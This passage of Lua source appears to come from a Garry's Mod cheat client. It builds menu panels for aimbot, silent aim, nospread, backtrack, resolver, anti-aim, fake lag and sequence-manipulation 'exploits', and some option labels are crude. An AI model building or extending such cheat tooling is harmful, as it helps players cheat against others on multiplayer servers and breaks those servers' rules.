                return a:GetColumnText( c2 ) < b:GetColumnText( c2 )
            end

            if ( c3 && a:GetColumnText( c3 ) != b:GetColumnText( c3 ) ) then
                if ( d3 ) then a, b = b, a end
                return a:GetColumnText( c3 ) < b:GetColumnText( c3 )
            end

            if ( c4 && a:GetColumnText( c4 ) != b:GetColumnText( c4 ) ) then
                if ( d4 ) then a, b = b, a end
                return a:GetColumnText( c4 ) < b:GetColumnText( c4 )
            end

            return true
        end )

        self:SetDirty( true )
        self:InvalidateLayout()

    end

    function PANEL:SortByColumn( ColumnID, Desc )

        table.Copy( self.Sorted, self.Lines )

        table.sort( self.Sorted, function( a, b )

            if ( Desc ) then
                a, b = b, a
            end

            local aval = a:GetSortValue( ColumnID ) || a:GetColumnText( ColumnID )
            local bval = b:GetSortValue( ColumnID ) || b:GetColumnText( ColumnID )


            if ( isnumber( aval ) && isnumber( bval ) ) then return aval < bval end

            return tostring( aval ) < tostring( bval )

        end )

        self:SetDirty( true )
        self:InvalidateLayout()

    end

    function PANEL:SelectItem( Item )

        if ( !Item ) then return end

        Item:SetSelected( true )
        self:OnRowSelected( Item:GetID(), Item )

    end

    function PANEL:SelectFirstItem()

        self:ClearSelection()
        self:SelectItem( self.Sorted[ 1 ] )

    end

    function PANEL:DoDoubleClick( LineID, Line )


    end

    function PANEL:OnRowSelected( LineID, Line )


    end

    function PANEL:OnRowRightClick( LineID, Line )


    end

    function PANEL:Clear()

        for k, v in pairs( self.Lines ) do
            v:Remove()
        end

        self.Lines = {}
        self.Sorted = {}

        self:SetDirty( true )

    end

    function PANEL:GetSelected()

        local ret = {}

        for k, v in pairs( self.Lines ) do
            if ( v:IsLineSelected() ) then
                table.insert( ret, v )
            end
        end

        return ret

    end

    function PANEL:SizeToContents()

        self:SetHeight( self.pnlCanvas:GetTall() + self:GetHeaderHeight() )

    end

    vgui.Register( "UListView", PANEL, "DPanel" )
end


do
    local PANEL = {}

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[24] )
        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( ultimate.Colors[54] )
        surface.DrawOutlinedRect( 0, 0, w, h, 1 )
    end

    vgui.Register( "USettingsPanel", PANEL, "ULifeTimeBase" )
end

do
    local PANEL = {}

    function PANEL:Init()
        self:Dock( RIGHT )
        self:DockMargin( 4, 0, 0, 0 )
        self:SetTall( 18 )
        self:SetWide( 18 )
        self:SetText( "..." )
    end

    vgui.Register( "USPanelButton", PANEL, "UButton" )
end

do
    local PANEL = {}

    function PANEL:Init()

        self.ButtonPanel = vgui.Create( "DPanel", self )
        self.ButtonPanel:Dock( TOP )
        self.ButtonPanel:DockMargin(3,3,3,2)
        self.ButtonPanel:SetTall(18)

        self.ItemPanel = vgui.Create( "DPanel", self )
        self.ItemPanel:Dock( FILL )
        self.ItemPanel:DockMargin( 3, 0, 3, 3 )

        self.ButtonPanel.Paint = nil
        self.ItemPanel.Paint = nil

        self.ActiveTab = "NIL"

        function self.ItemPanel:OnMousePressed()
            ultimate.frame:OnMousePressed()
        end

        function self.ItemPanel:OnMouseReleased()
            ultimate.frame:OnMouseReleased()
        end
    end

    function PANEL:Paint( w, h )
        surface.SetDrawColor( ultimate.Colors[54] )
        surface.DrawOutlinedRect( 0, 0, w, h, 1 )

        surface.SetFont( "DermaSmall" )

        surface.SetTextColor( ultimate.Colors[165] )
        surface.SetTextPos( 8, 2 )
        surface.DrawText( self.txt )

        surface.SetDrawColor( ultimate.Colors[ 54 ] )
        surface.DrawRect( 6, 20, w - 12, 1 )
    end

    function PANEL:OnMousePressed()
        ultimate.frame:OnMousePressed()
    end

    function PANEL:OnMouseReleased()
        ultimate.frame:OnMouseReleased()
    end

    function PANEL:GetItemPanel()
        return self.ItemPanel
    end

    function PANEL:GetButtonPanel()
        return self.ButtonPanel
    end

    vgui.Register( "UButtonBarPanel", PANEL, "Panel" )
end




// GUI FUNCS

ultimate.ui.ColorWindow = false
ultimate.ui.SettingsPan = false
ultimate.ui.MultiComboP = false

function ultimate.ui.RemovePanel( pan )
    if not pan then return end

    pan:Remove()
    pan = false
end

function ultimate.ui.Binder( cfg, par )
    local b = vgui.Create( "UBinder", par )
    b:SetValue( ultimate.cfg.binds[ cfg ] )

    function b:OnChange()
        ultimate.cfg.binds[ cfg ] = b:GetValue()
    end

    return b
end

function ultimate.ui.ColorPicker( cfg, par, onChange )
    local b = vgui.Create( "UCPicker", par )

    function b:DoClick()
        local x, y = self:LocalToScreen( 0, self:GetTall() )

        ultimate.ui.RemovePanel( ultimate.ui.ColorWindow )

        ultimate.ui.ColorWindow = vgui.Create( "UColorPanel" )
        ultimate.ui.ColorWindow:SetPos( x+25, y-100 )

        local c = vgui.Create( "UColorMixer", ultimate.ui.ColorWindow )
        local currentColor = string.ToColor( ultimate.cfg.colors[cfg] ) or Color(255, 255, 255, 255)
        c:SetColor( currentColor )

        c.HSV.Knob:SetSize( 5, 5 )

        function c.HSV.Knob:Paint( w, h )
            if b.Color then
                surface.SetDrawColor( b.Color.r or 255, b.Color.g or 255, b.Color.b or 255, b.Color.a or 255 )
            else
                surface.SetDrawColor( 255, 255, 255, 255 )
            end
            surface.DrawRect( 0, 0, w, h )

            surface.SetDrawColor( ultimate.Colors[255] )
            surface.DrawOutlinedRect( 0, 0, w, h, 1 )
        end

        function c:ValueChanged( col )
            if IsValid(b) then
                b.Color = col
            end
            ultimate.cfg.colors[cfg] = tostring(col.r) .. " " .. tostring(col.g) .. " " .. tostring(col.b) .. " " .. tostring(col.a)
            if onChange then onChange( col ) end
        end

    end

    b.Color = string.ToColor( ultimate.cfg.colors[cfg] ) or Color(255, 255, 255, 255)
end

function ultimate.ui.SPanel( func, p )
    local b = vgui.Create( "USPanelButton", p )

    function b:DoClick()
        local mx, my = input.GetCursorPos()

        ultimate.ui.RemovePanel( ultimate.ui.SettingsPan )

        ultimate.ui.SettingsPan = vgui.Create( "USettingsPanel" )
        ultimate.ui.SettingsPan:SetPos( mx+25, my-10 )

        func()
    end
end

function ultimate.ui.Label( pan, str, postCreate )
    local p = vgui.Create( "UCBPanel", pan )

    local lbl = vgui.Create( "DLabel", p )
    lbl:SetText( str )
    lbl:SetFont( "DermaSmall" )
    lbl:SetTextColor( ultimate.Colors[165] )
    lbl:Dock( LEFT )
    lbl:DockMargin( 4, 2, 4, 0 )
    lbl:SizeToContents()

    if postCreate then postCreate( p ) end
end

function ultimate.ui.CheckBox( par, lbl, cfg, hint, bind, color, spanel, onToggle, postCreate )
    local p = vgui.Create( "UCBPanel", par )

    local c = vgui.Create( "UCheckboxLabel", p )
    c:SetText( lbl )
    c:SetPos( 0, 0 )
    c:SetValue( ultimate.cfg.vars[cfg] )

    function c:OnChange( bval )
        ultimate.cfg.vars[cfg] = bval

        if onToggle then onToggle(bval) end
    end

    if postCreate then postCreate( p ) end

    if bind then ultimate.ui.Binder( cfg, p ) end
    if color then ultimate.ui.ColorPicker( cfg, p ) end
    if spanel then ultimate.ui.SPanel( spanel, p ) end

    if hint then
        function c.Label:Paint()
            if self:IsHovered() then
                local x, y = input.GetCursorPos()

                ultimate.hint = true
                ultimate.hintText = hint
                ultimate.hintX = x + 45
                ultimate.hintY = y - 5
            end
        end
    end
end

function ultimate.ui.Slider( p, str, cfg, min, max, dec, onChange )
    local pan = vgui.Create( "DPanel", p )
    pan:Dock( TOP )
    pan:DockMargin( 4, 2, 4, 0 )
    pan:SetTall( 20 )

    function pan:Paint( w, h )
        surface.SetFont("DermaSmall") -- TEXT SLIDER

        local s = ultimate.cfg.vars[cfg]
        local tw, th = surface.GetTextSize(s)

        surface.SetTextColor( ultimate.Colors[255] )

        surface.SetTextPos( 2, 4 )
        surface.DrawText( str )

        surface.SetTextPos( w - tw - 2, 4 )
        surface.DrawText( ultimate.cfg.vars[cfg] )
    end

    local c = vgui.Create( "USlider", p )
    c:Dock( TOP )
    c:DockMargin( 4, 2, 4, 0 )
    c:SetMax( max )
    c:SetMin( min )
    c:SetDecimals( dec )

    c:SetValue( ultimate.cfg.vars[cfg] )

    local value, min, max = c:GetValue(), c:GetMin(), c:GetMax()

	c:SetSlideX((value - min) / (max - min))

    function c:OnValueChanged( val )
        ultimate.cfg.vars[cfg] = val

        if onChange then onChange(val) end
    end
end

function ultimate.ui.Button( str, func, p )
    local b = vgui.Create( "UButton", p )
    b:SetText( str )

    function b:DoClick()
        func()
    end
end

function ultimate.ui.TextEntry( str, cfg, pan, chars, postCreate )
    local lbl = vgui.Create("DLabel",pan)
    lbl:Dock(TOP)
    lbl:DockMargin(4,2,4,0)
    lbl:SetText(str)
    lbl:SetFont("DermaSmall")
    lbl:SetColor(ultimate.Colors[165])

    local p = vgui.Create("DPanel",pan)
    p:SetTall(25)
    p:Dock(TOP)
    p:DockMargin(4,2,4,0)

    p.Paint = function(s,w,h)
        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h)
    end

	local txt = vgui.Create("DTextEntry",p)
	txt:Dock(FILL)
	txt:DockMargin(4,4,4,4)
	txt:IsMultiline( false )
	txt:SetMaximumCharCount(chars)
	txt:SetPlaceholderText(str)
	txt:SetFont( "DermaSmall" )
    txt:SetPaintBackground(false)
    txt:SetTextColor(ultimate.Colors[165])

	if ultimate.cfg.vars[cfg] != nil and ultimate.cfg.vars[cfg] != "" then
		txt:SetValue(ultimate.cfg.vars[cfg])
	end

	function txt.Think()
		if txt:IsEditing() then return end
        if ultimate.cfg.vars[cfg] == txt:GetValue() then return end

		ultimate.cfg.vars[cfg] = txt:GetValue()
	end

	function txt.OnValueChange()
		ultimate.cfg.vars[cfg] = txt:GetValue()
	end

    if postCreate then postCreate(p) end
end

function ultimate.ui.dropdownButton( str, v, p, a )
    local b = p:Add("DButton")
    b:Dock(TOP)
    b:SetTall(20)
    b:DockMargin(2,2,2,0)
    b:SetText("")

    function b:Paint(w,h)
        if self:IsHovered() then
            surface.SetDrawColor( ultimate.Colors[ 32 ] )
            surface.DrawRect( 1, 1, w - 2, h - 2 )
        end

        surface.SetTextColor(ultimate.Colors[165])

        if ultimate.cfg.vars[str.."-"..v] then
            surface.SetTextColor(ultimate.Colors[235])
        end

        surface.SetTextPos(5,3)
        surface.SetFont("DermaSmall")
        surface.DrawText(v)
    end

    function b:DoClick()
        ultimate.cfg.vars[str.."-"..v] = not ultimate.cfg.vars[str.."-"..v]
    end
end

function ultimate.ui.MultiCombo( pan, str, choices )
    local lbl = vgui.Create("DLabel",pan)
    lbl:Dock(TOP)
    lbl:DockMargin(4,1,4,0)
    lbl:SetText(str)
    lbl:SetFont("DermaSmall")
    lbl:SetColor(ultimate.Colors[255])

    local d = vgui.Create("DButton",pan)
    d:Dock(TOP)
    d:DockMargin(4,1,4,0)
    d:SetTall(20)
    d:SetText("")

    d.preview = {}

    function d:Paint(w,h)
        local preview = ""

        for k, v in pairs(choices) do
            if ultimate.cfg.vars[str.."-"..v] == true and (d.preview[v] == false or d.preview[v] == nil) and not table.HasValue(d.preview, v) then
                table.insert(d.preview,v)
            elseif ultimate.cfg.vars[str.."-"..v] == false and (d.preview[v] == true or d.preview[v] == nil) and table.HasValue(d.preview, v) then
                table.RemoveByValue(d.preview,v)
            elseif d.preview[v] == false then
                table.RemoveByValue(d.preview,v)
            end
        end

        preview = table.concat(d.preview,", ")

        surface.SetDrawColor(ultimate.Colors[25])
        surface.DrawRect(0,0,w,h)

        surface.SetTextColor(ultimate.Colors[255])
        surface.SetTextPos(8,20/2-15/2)
        surface.SetFont("DermaSmall")
        surface.DrawText(preview)

        surface.SetDrawColor(ultimate.Colors[32])
        surface.DrawRect(w-25,0,25,25)

        surface.SetTextColor(ultimate.Colors[255])
        surface.SetTextPos(w-20,20/2-15/2)
        surface.SetFont("DermaSmall")
        surface.DrawText("▼")

        surface.SetDrawColor(ultimate.Colors[54])
        surface.DrawOutlinedRect(0,0,w,h,1)
    end

    function d:DoClick()
        local x,y = self:LocalToScreen( 0, self:GetTall() )

        ultimate.ui.RemovePanel( ultimate.ui.MultiComboP )

        local ctoh = #choices

        ultimate.ui.MultiComboP = vgui.Create( "ULifeTimeBase" )
        ultimate.ui.MultiComboP:SetPos( x, y - 1 )
        ultimate.ui.MultiComboP:SetSize( 243, ctoh * 22 + 2 )

        for k, v in pairs(choices) do
            ultimate.ui.dropdownButton( str, v, ultimate.ui.MultiComboP, d.preview )
        end
    end
end

function ultimate.ui.ComboBox( pan, str, cfg, choices )
    local lbl = vgui.Create("DLabel",pan)
    lbl:Dock(TOP)
    lbl:DockMargin(4,1,4,0)
    lbl:SetText(str)
    lbl:SetFont("DermaSmall")
    lbl:SetColor(ultimate.Colors[255])

    local dropdown = vgui.Create("UComboBox",pan)
    dropdown:Dock(TOP)
    dropdown:DockMargin(4,1,4,0)

    if ultimate.presets[ cfg ] then
        choices = ultimate.presets[ cfg ]
    end

    choices = istable( choices ) and choices or {}

    for k, v in ipairs( choices ) do
        dropdown:AddChoice( v )
    end

    dropdown:SetSortItems(false)

    if #choices > 0 then
        local savedIndex = tonumber( ultimate.cfg.vars[cfg] ) or 1
        savedIndex = math_Clamp( savedIndex, 1, #choices )

        dropdown:ChooseOptionID( savedIndex )
    else
        dropdown:SetEnabled( false )
    end

    function dropdown:OnSelect(index, value, data)
        ultimate.cfg.vars[cfg] = index
    end

    return lbl, dropdown
end

function ultimate.ui.InitMT( p, postCreate )
    p.ItemPanel:Remove()

    p.ItemPanel = vgui.Create( "DPanel", p )
    p.ItemPanel:Dock( FILL )
    p.ItemPanel:DockMargin( 3, 0, 3, 3 )

    p.ItemPanel.Paint = nil

    if postCreate then postCreate( p.ItemPanel ) end
end

function ultimate.ui.MTButton( p, str, postCreate )
    surface.SetFont("DermaSmall")
    local w, h = surface.GetTextSize(str)

    local fw = w + 5

    local tx, ty = fw/2 - w/2, 18 / 2-h / 2 - 1

    local b = p:GetButtonPanel():Add("DButton")
    b:Dock(RIGHT)
    b:DockMargin(2,0,2,1)
    b:SetWide(fw)
    b:SetText("")

    function b:DoClick()
        p.ActiveTab = str
        ultimate.ui.InitMT( p, postCreate )
    end

    function b:Paint(width,height)
        if p.ActiveTab == str then
            surface.SetTextColor(235,235,235,255)
        else
            surface.SetTextColor(165,165,165,255)
        end

        surface.DrawRect(0,0,width,height)

        surface.SetFont("DermaSmall")
        surface.SetTextPos(tx,ty)
        surface.DrawText(str)
    end

    p.ActiveTab = str
    ultimate.ui.InitMT( p, postCreate )
end

ultimate.pty = { 5, 5, 5 }
do
    local xt = {
        [1] = 5,
        [2] = 267,
        [3] = 529
    }

    function ultimate.itemPanel( str, tbl, h )
        local p = vgui.Create( "UPanel", ultimate.scrollpanel )
        p:SetPos( xt[tbl], ultimate.pty[tbl] )
        p:SetSize( 257, h )
        p.txt = str

        ultimate.pty[ tbl ] = ultimate.pty[ tbl ] + h + 5

        return p
    end

    function ultimate.itemPanelB( str, tbl, h, buttonsFunc )
        local p = vgui.Create( "UButtonBarPanel", ultimate.scrollpanel )
        p:SetPos( xt[tbl], ultimate.pty[tbl] )
        p:SetSize( 257, h )
        p.txt = str

        if buttonsFunc then buttonsFunc( p ) end

        ultimate.pty[ tbl ] = ultimate.pty[ tbl ] + h + 5

        return p
    end

end

/*
    Drag n drop
*/

ultimate.espposes = {"Up","Down","Right","Left"}
ultimate.espelements = {"Name pos","Usergroup pos","Health pos","Armor pos","Money pos","Weapon pos","Team pos","Break LC pos","Simtime pos"}
ultimate.lastdrag = ""
ultimate.esppans = {}

ultimate.esppansposes = {
    [1] = {
        x = 85,
        y = 0,
    },
    [2] = {
        x = 85,
        y = 250,
    },
    [3] = {
        x = 170,
        y = 125,
    },
    [4] = {
        x = 0,
        y = 125,
    },
}

for i = 1, 4 do
    ultimate.esppans[i] = {}
end

function ultimate.DoDrop( self, panels, bDoDrop, Command, x, y )
    if ( bDoDrop ) then
        local newpos = self.pos

        for i = 1, #panels do
            local v = panels[i]

            ultimate.cfg.vars[ v:GetText() ] = newpos
            v:SetParent( self )
        end
    end
end

ultimate.spfuncs = {}

// PANEL CREATION

ultimate.frame = vgui.Create("UFrame")
ultimate.scrollpanel = vgui.Create("UScroll",ultimate.frame)

ultimate.tabs = {}

// Aimbot

ultimate.spfuncs[30] = function()
    ultimate.ui.SettingsPan:SetSize(250,200)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Force seed", "Force seed" )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Wait for seed", "Wait for seed" )


end

ultimate.spfuncs[32] = function()
    ultimate.ui.SettingsPan:SetSize(250,200)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Max simulation time", "Crossbow max simtime", 1, 10, 2 )

end

ultimate.spfuncs[912] = function()
    ultimate.ui.SettingsPan:SetSize(250,160)

    ultimate.ui.Label( ultimate.ui.SettingsPan, "GTA Marker Color", function( p ) ultimate.ui.ColorPicker( "GTA Marker", p ) end )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "GTA Radius", "GTA Marker Radius", 5, 80, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "GTA Size", "GTA Marker Size", 3, 30, 0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "GTA Speed", "GTA Marker Speed", 1, 300, 0 )
end

ultimate.spfuncs[913] = function()
    ultimate.ui.SettingsPan:SetSize(250,155)

    ultimate.ui.Label( ultimate.ui.SettingsPan, "Header", function( p ) ultimate.ui.ColorPicker( "Spectator list header", p ) end )
    ultimate.ui.Label( ultimate.ui.SettingsPan, "Accent", function( p ) ultimate.ui.ColorPicker( "Spectator list accent", p ) end )
    ultimate.ui.Label( ultimate.ui.SettingsPan, "Title", function( p ) ultimate.ui.ColorPicker( "Spectator list title", p ) end )
    ultimate.ui.Label( ultimate.ui.SettingsPan, "Text", function( p ) ultimate.ui.ColorPicker( "Spectator list text", p ) end )
    ultimate.ui.Label( ultimate.ui.SettingsPan, "Target", function( p ) ultimate.ui.ColorPicker( "Spectator list target", p ) end )
end

function ultimate.tabs.Aimbot()

    local p = ultimate.itemPanel("Main",1,210):GetItemPanel()

    ultimate.ui.CheckBox( p, "Enable aimbot", "Enable aimbot", false, false, false, false, false, function( p ) ultimate.ui.Binder( "Aim on key", p ) end )
    ultimate.ui.CheckBox( p, "Silent aim", "Silent aim" )
    ultimate.ui.CheckBox( p, "pSilent", "pSilent", "Make aim completely invisible." )
    ultimate.ui.CheckBox( p, "Auto fire", "Auto fire", "Automatically fires when targets can be damaged.", false, false, ultimate.spfuncs[2] )
    ultimate.ui.CheckBox( p, "Auto reload", "Auto reload", "Automatically reloads weapon when clip is empty." )
    ultimate.ui.CheckBox( p, "Fov limit", "Fov limit" )
    ultimate.ui.Slider( p, "Aimbot FOV", "Aimbot FOV", 0, 180, 0 )

    local p = ultimate.itemPanel( "Visualisation", 1, 140 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "FOV Circle", "Show FOV", false, false, true )
    ultimate.ui.CheckBox( p, "Snapline", "Aimbot snapline", false, false, true )
    ultimate.ui.CheckBox( p, "Marker", "Aimbot marker", false, false, true, ultimate.spfuncs[912] )
    ultimate.ui.ComboBox( p, "Marker type", "Aimbot marker type", { "Default", "GTA", "Circle" } )

    local p = ultimate.itemPanel( "Accuracy", 2, 120 ):GetItemPanel()

    ultimate.ui.CheckBox(p, "Compensate recoil", "Norecoil" )
    ultimate.ui.CheckBox( p, "Compensate spread", "Nospread", "Supported HL2, M9K, FAS2, CW2, SWB", false, false, ultimate.spfuncs[30] )
    ultimate.ui.CheckBox( p, "Enable hvh spread", "HvHNoSpread", "Supported SWB and different weapons on this type" )
     ultimate.ui.CheckBox( p, "Disable visual recoil", "Disable visual recoil", "Only works on FAS2, SWB, CW2 and more!" )

    local p = ultimate.itemPanel( "Prediction", 2, 55 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Crossbow prediction", "Crossbow prediction" )
    --ultimate.ui.Slider( p, "Simulation limit", "Simulation limit", 1, 10, 2 )

    local p = ultimate.itemPanel("Knife bot",2,130):GetItemPanel()

    ultimate.ui.CheckBox( p, "Knife bot", "Knifebot", false, false, false )
    ultimate.ui.ComboBox( p, "Knifebot mode", "Knifebot mode"  )
    ultimate.ui.CheckBox( p, "Facestab", "Facestab" )

    local p = ultimate.itemPanel( "Target selection", 3, 200 ):GetItemPanel()

    ultimate.ui.ComboBox( p, "Target selection", "Target selection", { "Distance", "FOV" } )
    ultimate.ui.MultiCombo( p, "Ignores", { "Friends", "Steam friends", "Teammates", "Driver", "Head unhitable", "God time", "Nocliping", "Nodraw", "Frozen", "Bots", "Admins" } )
    ultimate.ui.CheckBox( p, "Awall", "Awall" )
    ultimate.ui.Slider( p, "Max targets", "Max targets", 0, 10, 0 )
    ultimate.ui.CheckBox( p, "Target-Priority-Only", "Target-Priority-Only" )

    local p = ultimate.itemPanel( "Hitbox selection", 3, 280 ):GetItemPanel()

    ultimate.ui.ComboBox( p, "Hitbox selection", "Hitbox selection", { "Head", "Chest", "Penis" } )
    ultimate.ui.CheckBox( p, "Hitscan", "Hitscan" )
    ultimate.ui.MultiCombo( p, "Hitscan groups", { "Head", "Chest", "Stomach", "Arms", "Legs", "Generic" } )
    ultimate.ui.CheckBox( p, "Multipoint", "Multipoint" )
    ultimate.ui.MultiCombo( p, "Multipoint groups", { "Head", "Chest", "Stomach", "Arms", "Legs", "Generic" } )
    ultimate.ui.Slider( p, "Multipoint scale", "Multipoint scale", 0.5, 1, 1 )
end



ultimate.spfuncs[22] = function()
    ultimate.ui.SettingsPan:SetSize(250,200)

    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Lag limit","Lag limit",1,23,0 )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Random min","Lag randomisation",1,23,0 )
    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Lag mode", "Lag mode", {"Static","Adaptive","Hybrid"})
    ultimate.ui.MultiCombo( ultimate.ui.SettingsPan, "Fake lag options", {"Disable on ladder","Disable in attack","Randomise","On peek"} )
end

ultimate.spfuncs[24] = function( p )

end

ultimate.spfuncs[36] = function()
    ultimate.ui.SettingsPan:SetSize(250,200)
    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Material", "Antiaim material", ultimate.chamsMaterials)
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Fullbright", "Antiaim fullbright" )
end

function ultimate.tabs.Rage()
    local p = ultimate.itemPanel( "Angles", 1, 245 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Enable Anti-Aim", "Anti aim", false, true )
    ultimate.ui.CheckBox( p, "Inverter", "Inverter", false, true )
    ultimate.ui.ComboBox( p, "Yaw base", "Yaw base" )
    ultimate.ui.ComboBox( p, "Yaw", "Yaw" )
    ultimate.ui.ComboBox( p, "Pitch", "Pitch" )
    ultimate.ui.ComboBox( p, "Edge", "Edge", { "Disabled", "Hide", "Show", "Jitter" } )

    local p = ultimate.itemPanel( "Tweaks", 1, 185 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "On shot aa", "On shot aa" )
    ultimate.ui.CheckBox( p, "Yaw randomisation", "Yaw randomisation" )
    ultimate.ui.CheckBox( p, "Freestanding", "Freestanding" )
    ultimate.ui.CheckBox( p, "Micromovement", "Micromovement" )

    local p = ultimate.itemPanel( "Custom angles", 1, 320 ):GetItemPanel()

    ultimate.ui.Slider( p, "Custom real","Custom real", -180, 180, 0 )
    ultimate.ui.Slider( p, "Custom fake","Custom fake", -180, 180, 0 )
    ultimate.ui.Slider( p, "Custom pitch","Custom pitch", -360, 360, 0 )
    ultimate.ui.Slider( p, "Spin speed","Spin speed", -50, 50, 0 )
    ultimate.ui.Slider( p, "Sin delta","Sin delta", -360, 360, 0 )
    ultimate.ui.Slider( p, "Sin add","Sin add", -180, 180, 0 )
    ultimate.ui.Slider( p, "Jitter delta","Jitter delta", -180, 180, 0 )

    local p = ultimate.itemPanel( "Fake lag",2,120 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Fake lag", "Fake lag", false, false, false, ultimate.spfuncs[22] )
    ultimate.ui.CheckBox( p, "Fake duck", "Fake duck", false, true )
    ultimate.ui.CheckBox( p, "Mohammad exploit", "Air lag duck" )
    ultimate.ui.CheckBox( p, "Jesus exploit", "Jesus lag" )

    local p = ultimate.itemPanel( "Visualisation", 2,75 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Fake angle chams", "Anti aim chams", false, false, false, ultimate.spfuncs[36], false, function( p ) ultimate.ui.ColorPicker( "Real chams", p ) end )
    ultimate.ui.CheckBox( p, "Hitbox", "Hitbox", false, false, true)

    local p = ultimate.itemPanel( "Animation breaker", 2, 225 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Taunt spam", "Taunt spam" )
    ultimate.ui.ComboBox( p, "Taunt", "Taunt", ultimate.actCommands )
    ultimate.ui.CheckBox( p, "Taunt spam 2", "Taunt spam 2" )
    ultimate.ui.ComboBox( p, "Taunt 2", "Taunt 2", ultimate.actCommands2 )
    ultimate.ui.CheckBox( p, "Handjob", "Handjob" )
    ultimate.ui.ComboBox( p, "Handjob mode", "Handjob mode", {"Up","Parkinson","Ultra cum"} )

    //local p = ultimate.itemPanel( "Tickbase", 2, 265 ):GetItemPanel()

    //ultimate.ui.CheckBox( p, "Enable shift", "Tickbase shift", false, true, false, false, function(b) jopa.EnableTickbaseShifting(b) end )

    //ultimate.ui.ComboBox( p, "Fakelag comp", "Fakelag comp", {"Disable","Compensate"} )
    //ultimate.ui.CheckBox( p, "Warp on peek", "Warp on peek" )
    //ultimate.ui.CheckBox( p, "Double tap", "Double tap" )
    //ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Passive recharge", "Passive recharge" )
    //ultimate.ui.CheckBox( p, "Dodge projectiles", "Dodge projectiles" )
    //ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Wait for charge", "Wait for charge", false, false, false, false, function(b) jopa.WaitForCharge(b) end )
    //ultimate.ui.CheckBox( p, "Auto recharge", "Auto recharge", false, true )

    //ultimate.ui.Slider( p, "Shift ticks", "Shift ticks", 1, 99, 0, function( val ) jopa.SetMinShift(val) end )
    //ultimate.ui.Slider( p, "Charge ticks", "Charge ticks", 1, 99, 0, function( val ) jopa.SetMaxShift(val) end )

    local p = ultimate.itemPanel( "Sequence", 2, 240 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Sequence manip", "Sequence manip", false, true )
    ultimate.ui.ComboBox( p, "Sequence mode", "Sequence mode", { "Standard", "Advanced (Choke)" } )
    ultimate.ui.CheckBox( p, "Sequence resolver", "Sequence resolver" )
    ultimate.ui.Slider( p, "Out Sequence", "OutSequence", 1, 128, 0 )
    ultimate.ui.Slider( p, "Min Sequence", "Sequence min", 1, 128, 0 )
    ultimate.ui.CheckBox( p, "Randomise", "Sequence min random" )
    ultimate.ui.CheckBox( p, "Animation freezer", "Animation freezer", false, true )

    local p = ultimate.itemPanel( "Player adjustments", 3, 205 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Interpolation", "Disable interpolation", false, false, false, false, function( bval ) jopa.SetInterpolation( bval ) end )
    ultimate.ui.CheckBox( p, "Sequence interpolation", "Disable Sequence interpolation", false, false, false, false, function( bval ) jopa.SetSequenceInterpolation( bval ) end )
    ultimate.ui.CheckBox( p, "Disable Taunts", "Disable Taunts" )
    ultimate.ui.CheckBox( p, "Tpose", "Invalidate activity" )
    ultimate.ui.CheckBox( p, "Fix bones", "Bone fix", false, false, false, false, function( bval ) jopa.EnableBoneFix( bval ) end )
    ultimate.ui.CheckBox( p, "Fix animations", "Update Client Anim fix", false, false, false, false, function( bval ) jopa.EnableAnimFix( bval ) end )
    ultimate.ui.CheckBox( p, "Extrapolation", "Extrapolation" )
    ultimate.ui.CheckBox( p, "Show extrapolation line", "Show extrapolation line" )

    local p = ultimate.itemPanel( "Resolver", 3, 150 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Resolver", "Resolver" )
    ultimate.ui.TextEntry( "Brute Yaw", "Brute Yaw Value", p, 999 )
    ultimate.ui.CheckBox( p, "Pitch resolver", "Pitch resolver" )
    ultimate.ui.CheckBox( p, "Taunt resolver", "Taunt resolver" )

    local p = ultimate.itemPanel( "Position adjustment", 3, 215 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Adjust tickcount", "Adjust tickcount" )
    ultimate.ui.CheckBox( p, "Backtrack", "Backtrack" )
    ultimate.ui.ComboBox( p, "Backtrack mode", "Backtrack mode", { "Last ticks", "Closest", "Scan" } )
    ultimate.ui.Slider( p, "Sampling interval", "Sampling interval", 0, 200, 0 )
    ultimate.ui.Slider( p, "Backtrack time", "Backtrack time", 0, 1000, 0 )
    ultimate.ui.CheckBox( p, "Always backtrack", "Always backtrack" )

    local p = ultimate.itemPanel( "Misc", 3, 195 ):GetItemPanel()

    ultimate.ui.CheckBox( p, "Auto detonator", "Auto detonator" )
    ultimate.ui.Slider( p, "Detonation distance", "AutoD distance", 16, 128, 0 )


    ultimate.ui.CheckBox( p, "Gun switch", "Gun switch" )

end

ultimate.spfuncs[2] = function()
    ultimate.ui.SettingsPan:SetSize(250,225)

    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Rapid fire", "Rapid fire", "Allows to quickly fire semi-automatic weapons." )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Bullet time", "Bullet time", "Aim will not work until weapon can fire." )
    ultimate.ui.Slider( ultimate.ui.SettingsPan, "Time", "Time", 0, 1, 3 )
    ultimate.ui.CheckBox( ultimate.ui.SettingsPan, "Wait for simulation", "Wait for simulation" )
    ultimate.ui.ComboBox( ultimate.ui.SettingsPan, "Wait for dedulation", "dedulation", {"target simtime", "LocalPlayer simtime"} )
